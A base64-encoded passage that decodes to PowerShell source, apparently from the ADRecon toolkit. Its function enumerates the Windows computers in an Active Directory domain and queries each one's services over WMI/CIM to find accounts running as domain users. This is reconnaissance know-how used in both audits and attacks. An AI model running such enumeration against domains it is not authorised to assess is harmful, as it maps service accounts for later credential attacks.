RpcmVjdG9yeSBkb21haW4uCgouREVTQ1JJUFRJT04KICAgIFJldHJpZXZlcyBhIGxpc3Qgb2YgYWxsIGNvbXB1dGVycyBpbiB0aGUgY3VycmVudCBkb21haW4gYW5kIHJlYWRzIHNlcnZpY2UgY29uZmlndXJhdGlvbiB1c2luZyBHZXQtV21pT2JqZWN0LgoKLlBBUkFNRVRFUiBQcm90b2NvbAogICAgW3N0cmluZ10KICAgIFdoaWNoIHByb3RvY29sIHRvIHVzZTsgQURXUyAoZGVmYXVsdCkgb3IgTERBUC4KCi5QQVJBTUVURVIgb2JqRG9tYWluCiAgICBbRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnldCiAgICBEb21haW4gRGlyZWN0b3J5IEVudHJ5IG9iamVjdC4KCi5QQVJBTUVURVIgUGFnZVNpemUKICAgIFtpbnRdCiAgICBUaGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuIERlZmF1bHQgMjAwLgoKLlBBUkFNRVRFUiBUaHJlYWRzCiAgICBbaW50XQogICAgVGhlIG51bWJlciBvZiB0aHJlYWRzIHRvIHVzZSBkdXJpbmcgcHJvY2Vzc2luZyBvZiBvYmplY3RzLiBEZWZhdWx0IDEwLgoKLk9VVFBVVFMKICAgIFBTT2JqZWN0LgojPgogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW3N0cmluZ10gJFByb3RvY29sLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW0RpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5XSAkb2JqRG9tYWluLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW2ludF0gJFBhZ2VTaXplLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW2ludF0gJFRocmVhZHMgPSAxMAogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkcmVhZFNlcnZpY2VBY2NvdW50cyA9IFtzY3JpcHRibG9ja10gewogICAgICAgICAgICAjIHNjcmlwdGJsb2NrIHRvIHJldHJpZXZlIHNlcnZpY2UgbGlzdCBmb3JtIGEgcmVtb3ZlIG1hY2hpbmUKICAgICAgICAgICAgJGhvc3RuYW1lID0gW3N0cmluZ10gJGFyZ3NbMF0KICAgICAgICAgICAgJE9wZXJhdGluZ1N5c3RlbSA9IFtzdHJpbmddICRhcmdzWzFdCiAgICAgICAgICAgICMkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSAkYXJnc1syXQogICAgICAgICAgICAkQ3JlZGVudGlhbCA9ICRhcmdzWzJdCiAgICAgICAgICAgICR0aW1lb3V0ID0gMjUwCiAgICAgICAgICAgICRwb3J0ID0gMTM1CiAgICAgICAgICAgIFRyeQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkdGNwY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVGNwQ2xpZW50CiAgICAgICAgICAgICAgICAkcmVzdWx0ID0gJHRjcGNsaWVudC5CZWdpbkNvbm5lY3QoJGhvc3RuYW1lLCRwb3J0LCRudWxsLCRudWxsKQogICAgICAgICAgICAgICAgJHN1Y2Nlc3MgPSAkcmVzdWx0LkFzeW5jV2FpdEhhbmRsZS5XYWl0T25lKCR0aW1lb3V0LCRudWxsKQogICAgICAgICAgICB9CiAgICAgICAgICAgIENhdGNoCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICR3YXJuaW5nID0gIiRob3N0bmFtZSAoJE9wZXJhdGluZ1N5c3RlbSkgaXMgdW5yZWFjaGFibGUgJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgICAgICAgICAkc3VjY2VzcyA9ICRmYWxzZQogICAgICAgICAgICAgICAgJHRjcGNsaWVudC5DbG9zZSgpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgSWYgKCRzdWNjZXNzKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAjIFBvd2VyU2hlbGx2MiBkb2VzIG5vdCBzdXBwb3J0IE5ldy1DaW1TZXNzaW9uCiAgICAgICAgICAgICAgICBJZiAoJFBTVmVyc2lvblRhYmxlLlBTVmVyc2lvbi5NYWpvciAtbmUgMikKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBJZiAoJENyZWRlbnRpYWwgLW5lIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkc2Vzc2lvbiA9IE5ldy1DaW1TZXNzaW9uIC1Db21wdXRlck5hbWUgJGhvc3RuYW1lIC1TZXNzaW9uT3B0aW9uICQoTmV3LUNpbVNlc3Npb25PcHRpb24g4oCTUHJvdG9jb2wgRENPTSkgLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICAgICAgICAgICAgICAgICAgSWYgKCRzZXNzaW9uKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc2VydmljZUxpc3QgPSBAKCBHZXQtQ2ltSW5zdGFuY2UgLUNsYXNzTmFtZSBXaW4zMl9TZXJ2aWNlIC1Qcm9wZXJ0eSBOYW1lLFN0YXJ0TmFtZSxTeXN0ZW1OYW1lIC1DaW1TZXNzaW9uICRzZXNzaW9uIC1FcnJvckFjdGlvbiBTdG9wKQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIEVsc2UKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRzZXNzaW9uID0gTmV3LUNpbVNlc3Npb24gLUNvbXB1dGVyTmFtZSAkaG9zdG5hbWUgLVNlc3Npb25PcHRpb24gJChOZXctQ2ltU2Vzc2lvbk9wdGlvbiDigJNQcm90b2NvbCBEQ09NKQogICAgICAgICAgICAgICAgICAgICAgICBJZiAoJHNlc3Npb24pCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzZXJ2aWNlTGlzdCA9IEAoIEdldC1DaW1JbnN0YW5jZSAtQ2xhc3NOYW1lIFdpbjMyX1NlcnZpY2UgLVByb3BlcnR5IE5hbWUsU3RhcnROYW1lLFN5c3RlbU5hbWUgLUNpbVNlc3Npb24gJHNlc3Npb24gLUVycm9yQWN0aW9uIFN0b3AgKQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgRWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIElmICgkQ3JlZGVudGlhbCAtbmUgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRzZXJ2aWNlTGlzdCA9IEAoIEdldC1XbWlPYmplY3QgLUNsYXNzIFdpbjMyX1NlcnZpY2UgLUNvbXB1dGVyTmFtZSAkaG9zdG5hbWUgLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwgLUltcGVyc29uYXRpb24gMyAtUHJvcGVydHkgTmFtZSxTdGFydE5hbWUsU3lzdGVtTmFtZSAtRXJyb3JBY3Rpb24gU3RvcCApCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIEVsc2UKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRzZXJ2aWNlTGlzdCA9IEAoIEdldC1XbWlPYmplY3QgLUNsYXNzIFdpbjMyX1NlcnZpY2UgLUNvbXB1dGVyTmFtZSAkaG9zdG5hbWUgLVByb3BlcnR5IE5hbWUsU3RhcnROYW1lLFN5c3RlbU5hbWUgLUVycm9yQWN0aW9uIFN0b3AgKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRzZXJ2aWNlTGlzdAogICAgICAgICAgICB9CiAgICAgICAgICAgIFRyeQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBJZiAoJHRjcGNsaWVudCkgeyAkdGNwY2xpZW50LkVuZENvbm5lY3QoJHJlc3VsdCkgfCBPdXQtTnVsbCB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgQ2F0Y2gKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJHdhcm5pbmcgPSAiJGhvc3RuYW1lICgkT3BlcmF0aW5nU3lzdGVtKSA6ICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICB9CiAgICAgICAgICAgICR3YXJuaW5nCiAgICAgICAgfQoKICAgICAgICBGdW5jdGlvbiBwcm9jZXNzQ29tcGxldGVkSm9icygpCiAgICAgICAgewogICAgICAgICAgICAjIHJlYWRzIHNlcnZpY2UgbGlzdCBmcm9tIGNvbXBsZXRlZCBqb2JzLAogICAgICAgICAgICAjIHVwZGF0ZXMgJHNlcnZpY2VBY2NvdW50IHRhYmxlIGFuZCByZW1vdmVzIGNvbXBsZXRlZCBqb2IKCiAgICAgICAgICAgICRqb2JzID0gR2V0LUpvYiAtU3RhdGUgQ29tcGxldGVkCiAgICAgICAgICAgIEZvckVhY2goICRqb2IgaW4gJGpvYnMgKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBJZiAoJG51bGwgLW5lICRqb2IpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJGRhdGEgPSBSZWNlaXZlLUpvYiAkam9iCiAgICAgICAgICAgICAgICAgICAgUmVtb3ZlLUpvYiAkam9iCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgSWYgKCRkYXRhKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIElmICggJGRhdGEuR2V0VHlwZSgpIC1lcSBbT2JqZWN0W11dICkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRzZXJ2aWNlTGlzdCA9ICRkYXRhIHwgV2hlcmUtT2JqZWN0IHsgaWYgKCRfLlN0YXJ0TmFtZSkgeyAkXyB9fQogICAgICAgICAgICAgICAgICAgICAgICAkc2VydmljZUxpc3QgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkT2JqID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJBY2NvdW50IiAtVmFsdWUgJF8uU3RhcnROYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIlNlcnZpY2UgTmFtZSIgLVZhbHVlICRfLk5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiU3lzdGVtTmFtZSIgLVZhbHVlICRfLlN5c3RlbU5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIElmICgkXy5TdGFydE5hbWUudG9VcHBlcigpLkNvbnRhaW5zKCRjdXJyZW50RG9tYWluKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIlJ1bm5pbmcgYXMgRG9tYWluIFVzZXIiIC1WYWx1ZSAkdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiUnVubmluZyBhcyBEb21haW4gVXNlciIgLVZhbHVlICRmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNjcmlwdDpzZXJ2aWNlQWNjb3VudHMgKz0gJE9iagogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIEVsc2VJZiAoICRkYXRhLkdldFR5cGUoKSAtZXEgW1N0cmluZ10gKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHNjcmlwdDp3YXJuaW5ncyArPSAkZGF0YQogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICRkYXRhCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIFBST0NFU1MKICAgIHsKICAgICAgICAkc2NyaXB0OnNlcnZpY2VBY2NvdW50cyA9IEAoKQogICAgICAgIFtzdHJpbmdbXV0gJHdhcm5pbmdzID0gQCgpCiAgICAgICAgSWYgKCRQcm90b2NvbCAtZXEgJ0FEV1MnKQogICAgICAgIHsKICAgICAgICAgICAgVHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRBRERvbWFpbiA9IEdldC1BRERvbWFpbgogICAgICAgICAgICB9CiAgICAgICAgICAgIENhdGNoCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSRG9tYWluQWNjb3VudHN1c2VkZm9yU2VydmljZUxvZ29uXSBFcnJvciBnZXR0aW5nIERvbWFpbiBDb250ZXh0IgogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICAgICAgfQogICAgICAgICAgICBJZiAoJEFERG9tYWluKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkY3VycmVudERvbWFpbiA9ICRBRERvbWFpbi5OZXRCSU9TTmFtZS50b1VwcGVyKCkKICAgICAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRERvbWFpbgogICAgICAgICAgICB9CiAgICAgICAgICAgIEVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGN1cnJlbnREb21haW4gPSAiIgogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiQ3VycmVudCBEb21haW4gY291bGQgbm90IGJlIHJldHJpZXZlZC4iCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIFRyeQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkQURDb21wdXRlcnMgPSBHZXQtQURDb21wdXRlciAtRmlsdGVyIHsgRW5hYmxlZCAtZXEgJHRydWUgLWFuZCBPcGVyYXRpbmdTeXN0ZW0gLUxpa2UgIipXaW5kb3dzKiIgfSAtUHJvcGVydGllcyBOYW1lLEROU0hvc3ROYW1lLE9wZXJhdGluZ1N5c3RlbQogICAgICAgICAgICB9CiAgICAgICAgICAgIENhdGNoCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSRG9tYWluQWNjb3VudHN1c2VkZm9yU2VydmljZUxvZ29uXSBFcnJvciB3aGlsZSBlbnVtZXJhdGluZyBXaW5kb3dzIENvbXB1dGVyIE9iamVjdHMiCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICAgICAgICAgIFJldHVybiAkbnVsbAogICAgICAgICAgICB9CgogICAgICAgICAgICBJZiAoJEFEQ29tcHV0ZXJzKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAjIHN0YXJ0IGRhdGEgcmV0cmlldmFsIGpvYiBmb3IgZWFjaCBzZXJ2ZXIgaW4gdGhlIGxpc3QKICAgICAgICAgICAgICAgICMgdXNlIHVwIHRvICRUaHJlYWRzIHRocmVhZHMKICAgICAgICAgICAgICAgICRjbnQgPSAkKFtBRFJlY29uLkFEV1NDbGFzc106Ok9iamVjdENvdW50KCRBRENvbXB1dGVycykpCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbKl0gVG90YWwgV2luZG93cyBIb3N0czogJGNudCIKICAgICAgICAgICAgICAgICRpY250ID0gMAogICAgICAgICAgICAgICAgJEFEQ29tcHV0ZXJzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICRTdG9wV2F0Y2ggPSBbU3lzdGVtLkRpYWdub3N0aWNzLlN0b3BXYXRjaF06OlN0YXJ0TmV3KCkKICAgICAgICAgICAgICAgICAgICBJZiggJF8uZG5zaG9zdG5hbWUgKQoJICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGFyZ3MgPSBAKCRfLkROU0hvc3ROYW1lLCAkXy5PcGVyYXRpbmdTeXN0ZW0sICRDcmVkZW50aWFsKQoJCSAgICAgICAgICAgICAgICBTdGFydC1Kb2IgLVNjcmlwdEJsb2NrICRyZWFkU2VydmljZUFjY291bnRzIC1OYW1lICJyZWFkXyQoJF8ubmFtZSkiIC1Bcmd1bWVudExpc3QgJGFyZ3MgfCBPdXQtTnVsbAoJCSAgICAgICAgICAgICAgICArKyRpY250CgkJICAgICAgICAgICAgICAgIElmICgkU3RvcFdhdGNoLkVsYXBzZWQuVG90YWxNaWxsaXNlY29uZHMgLWdlIDEwMDApCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVByb2dyZXNzIC1BY3Rpdml0eSAiUmV0cmlldmluZyBkYXRhIGZyb20gc2VydmVycyIgLVN0YXR1cyAiJCgiezA6TjJ9IiAtZiAoKCRpY250LyRjbnQqMTAwKSwyKSkgJSBDb21wbGV0ZToiIC1QZXJjZW50Q29tcGxldGUgMTAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU3RvcFdhdGNoLlJlc2V0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTdG9wV2F0Y2guU3RhcnQoKQoJCSAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlICggKCBHZXQtSm9iIC1TdGF0ZSBSdW5uaW5nKS5jb3VudCAtZ2UgJFRocmVhZHMgKSB7IFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDMgfQoJCSAgICAgICAgICAgICAgICBwcm9jZXNzQ29tcGxldGVkSm9icwoJICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAjIHByb2Nlc3MgcmVtYWluaW5nIGpvYnMKCiAgICAgICAgICAgICAgICBXcml0ZS1Qcm9ncmVzcyAtQWN0aXZpdHkgIlJldHJpZXZpbmcgZGF0YSBmcm9tIHNlcnZlcnMiIC1TdGF0dXMgIldhaXRpbmcgZm9yIGJhY2tncm91bmQgam9icyB0byBjb21wbGV0ZS4uLiIgLVBlcmNlbnRDb21wbGV0ZSAxMDAKICAgICAgICAgICAgICAgIFdhaXQtSm9iIC1TdGF0ZSBSdW5uaW5nIC1UaW1lb3V0IDMwICB8IE91dC1OdWxsCiAgICAgICAgICAgICAgICBHZXQtSm9iIC1TdGF0ZSBSdW5uaW5nIHwgU3RvcC1Kb2IKICAgICAgICAgICAgICAgIHByb2Nlc3NDb21wbGV0ZWRKb2JzCiAgICAgICAgICAgICAgICBXcml0ZS1Qcm9ncmVzcyAtQWN0aXZpdHkgIlJldHJpZXZpbmcgZGF0YSBmcm9tIHNlcnZlcnMiIC1Db21wbGV0ZWQgLVN0YXR1cyAiQWxsIERvbmUiCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIElmICgkUHJvdG9jb2wgLWVxICdMREFQJykKICAgICAgICB7CiAgICAgICAgICAgICRjdXJyZW50RG9tYWluID0gKFtzdHJpbmddKCRvYmpEb21haW4ubmFtZSkpLnRvVXBwZXIoKQoKICAgICAgICAgICAgJG9ialNlYXJjaGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXIgJG9iakRvbWFpbgogICAgICAgICAgICAkT2JqU2VhcmNoZXIuUGFnZVNpemUgPSAkUGFnZVNpemUKICAgICAgICAgICAgJE9ialNlYXJjaGVyLkZpbHRlciA9ICIoJihzYW1BY2NvdW50VHlwZT04MDUzMDYzNjkpKCF1c2VyQWNjb3VudENvbnRyb2w6MS4yLjg0MC4xMTM1NTYuMS40LjgwMzo9Mikob3BlcmF0aW5nU3lzdGVtPSpXaW5kb3dzKikpIgogICAgICAgICAgICAkT2JqU2VhcmNoZXIuUHJvcGVydGllc1RvTG9hZC5BZGRSYW5nZSgoIm5hbWUiLCJkbnNob3N0bmFtZSIsIm9wZXJhdGluZ3N5c3RlbSIpKQogICAgICAgICAgICAkT2JqU2VhcmNoZXIuU2VhcmNoU2NvcGUgPSAiU3VidHJlZSIKCiAgICAgICAgICAgIFRyeQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkQURDb21wdXRlcnMgPSAkT2JqU2VhcmNoZXIuRmluZEFsbCgpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgQ2F0Y2gKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJEb21haW5BY2NvdW50c3VzZWRmb3JTZXJ2aWNlTG9nb25dIEVycm9yIHdoaWxlIGVudW1lcmF0aW5nIFdpbmRvd3MgQ29tcHV0ZXIgT2JqZWN0cyIKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICAgICAgUmV0dXJuICRudWxsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJE9ialNlYXJjaGVyLmRpc3Bvc2UoKQoKICAgICAgICAgICAgSWYgKCRBRENvbXB1dGVycykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgIyBzdGFydCBkYXRhIHJldHJpZXZhbCBqb2IgZm9yIGVhY2ggc2VydmVyIGluIHRoZSBsaXN0CiAgICAgICAgICAgICAgICAjIHVzZSB1cCB0byAkVGhyZWFkcyB0aHJlYWRzCiAgICAgICAgICAgICAgICAkY250ID0gJChbQURSZWNvbi5MREFQQ2xhc3NdOjpPYmplY3RDb3VudCgkQURDb21wdXRlcnMpKQogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIFRvdGFsIFdpbmRvd3MgSG9zdHM6ICRjbnQiCiAgICAgICAgICAgICAgICAkaWNudCA9IDAKICAgICAgICAgICAgICAgICRBRENvbXB1dGVycyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICBJZiggJF8uUHJvcGVydGllcy5kbnNob3N0bmFtZSApCgkgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkYXJncyA9IEAoJF8uUHJvcGVydGllcy5kbnNob3N0bmFtZSwgJF8uUHJvcGVydGllcy5vcGVyYXRpbmdzeXN0ZW0sICRDcmVkZW50aWFsKQoJCSAgICAgICAgICAgICAgICBTdGFydC1Kb2IgLVNjcmlwdEJsb2NrICRyZWFkU2VydmljZUFjY291bnRzIC1OYW1lICJyZWFkXyQoJF8uUHJvcGVydGllcy5uYW1lKSIgLUFyZ3VtZW50TGlzdCAkYXJncyB8IE91dC1OdWxsCgkJICAgICAgICAgICAgICAgICsrJGljbnQKCQkgICAgICAgICAgICAgICAgSWYgKCRTdG9wV2F0Y2guRWxhcHNlZC5Ub3RhbE1pbGxpc2Vjb25kcyAtZ2UgMTAwMCkKICAgICAgICAgICAgICAgICAgICAgICAgewoJCSAgICAgICAgICAgICAgICAgICAgV3JpdGUtUHJvZ3Jlc3MgLUFjdGl2aXR5ICJSZXRyaWV2aW5nIGRhdGEgZnJvbSBzZXJ2ZXJzIiAtU3RhdHVzICIkKCJ7MDpOMn0iIC1mICgoJGljbnQvJGNudCoxMDApLDIpKSAlIENvbXBsZXRlOiIgLVBlcmNlbnRDb21wbGV0ZSAxMDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTdG9wV2F0Y2guUmVzZXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFN0b3BXYXRjaC5TdGFydCgpCgkJICAgICAgICAgICAgICAgIH0KCQkgICAgICAgICAgICAgICAgd2hpbGUgKCAoIEdldC1Kb2IgLVN0YXRlIFJ1bm5pbmcpLmNvdW50IC1nZSAkVGhyZWFkcyApIHsgU3RhcnQtU2xlZXAgLVNlY29uZHMgMyB9CgkJICAgICAgICAgICAgICAgIHByb2Nlc3NDb21wbGV0ZWRKb2JzCgkgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICMgcHJvY2VzcyByZW1haW5pbmcgam9icwogICAgICAgICAgICAgICAgV3JpdGUtUHJvZ3Jlc3MgLUFjdGl2aXR5ICJSZXRyaWV2aW5nIGRhdGEgZnJvbSBzZXJ2ZXJzIiAtU3RhdHVzICJXYWl0aW5nIGZvciBiYWNrZ3JvdW5kIGpvYnMgdG8gY29tcGxldGUuLi4iIC1QZXJjZW50Q29tcGxldGUgMTAwCiAgICAgICAgICAgICAgICBXYWl0LUpvYiAtU3RhdGUgUnVubmluZyAtVGltZW91dCAzMCAgfCBPdXQtTnVsbAogICAgICAgICAgICAgICAgR2V0LUpvYiAtU3RhdGUgUnVubmluZyB8IFN0b3AtSm9iCiAgICAgICAgICAgICAgICBwcm9jZXNzQ29tcGxldGVkSm9icwogICAgICAgICAgICAgICAgV3JpdGUtUHJvZ3Jlc3MgLUFjdGl2aXR5ICJSZXRyaWV2aW5nIGRhdGEgZnJvbSBzZXJ2ZXJzIiAtQ29tcGxldGVkIC1TdGF0dXMgIkFsbCBEb25lIgogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBJZiAoJHNjcmlwdDpzZXJ2aWNlQWNjb3VudHMpCiAgICAgICAgewogICAgICAgICAgICBSZXR1cm4gJHNjcmlwdDpzZXJ2aWNlQWNjb3VudHMKICAgICAgICB9CiAgICAgICAgRWxzZQogICAgICAgIHsKICAgICAgICAgICAgUmV0dXJuICRudWxsCiAgICAgICAgfQogICAgfQp9CgpGdW5jdGlvbiBSZW1vdmUtRW1wdHlBRFJPdXRwdXREaXIKewo8IwouU1lOT1BTSVMKICAgIFJlbW92ZXMgQURSZWNvbiBvdXRwdXQgZm9sZGVyIGlmIGVtcHR5LgoKLkRFU0NSSVBUSU9OCiAgICBSZW1vdmVzIEFEUmVjb24gb3V0cHV0IGZvbGRlciBpZiBlbXB0eS4KCi5QQVJBTUVURVIgQURST3V0cHV0RGlyCiAgICBbc3RyaW5nXQoJUGF0aCBmb3IgQURSZWNvbiBvdXRwdXQgZm9sZGVyLgoKLlBBUkFNRVRFUiBPdXRwdXRUeXBlCiAgICBbYXJyYXldCiAgICBPdXRwdXQgVHlwZS4KIz4KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtzdHJpbmddICRBRFJPdXRwdXREaXIsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFthcnJheV0gJE91dHB1dFR5cGUKICAgICkKCiAgICBTd2l0Y2ggKCRPdXRwdXRUeXBlKQogICAgewogICAgICAgICdDU1YnCiAgICAgICAgewogICAgICAgICAgICAkQ1NWUGF0aCAgPSAtam9pbigkQURST3V0cHV0RGlyLCdcJywnQ1NWLUZpbGVzJykKICAgICAgICAgICAgSWYgKCEoVGVzdC1QYXRoIC1QYXRoICRDU1ZQYXRoXCopKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJSZW1vdmVkIEVtcHR5IERpcmVjdG9yeSAkQ1NWUGF0aCIKICAgICAgICAgICAgICAgIFJlbW92ZS1JdGVtICRDU1ZQYXRoCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJ1hNTCcKICAgICAgICB7CiAgICAgICAgICAgICRYTUxQYXRoICA9IC1qb2luKCRBRFJPdXRwdXREaXIsJ1wnLCdYTUwtRmlsZXMnKQogICAgICAgICAgICBJZiAoIShUZXN0LVBhdGggLVBhdGggJFhNTFBhdGhcKikpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZ